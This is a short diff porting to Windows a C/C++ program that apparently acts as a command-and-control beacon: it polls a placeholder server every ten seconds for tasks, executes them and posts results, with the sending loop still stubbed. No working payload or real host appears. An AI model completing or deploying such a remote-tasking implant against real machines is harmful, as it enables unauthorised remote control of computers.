@@ -3,7 +3,7 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #include <time.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
+#include <string>
 #include <curl/curl.h>
 
 #define SERVERNAME "placeholder"
@@ -15,7 +15,7 @@ size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string* data) {
 }
 void tasks(){
     while(1){
-        sleep(SLEEP);
+        Sleep(SLEEP);
         auto curl = curl_easy_init();
         if (curl) {
             curl_easy_setopt(curl, CURLOPT_URL, SERVERNAME);
@@ -54,7 +54,7 @@ char * execute(){
 
 int sendresults(){
     while(1){
-        sleep(SLEEP);
+        Sleep(SLEEP);
         //Send results, check response
         //If good response break
     }
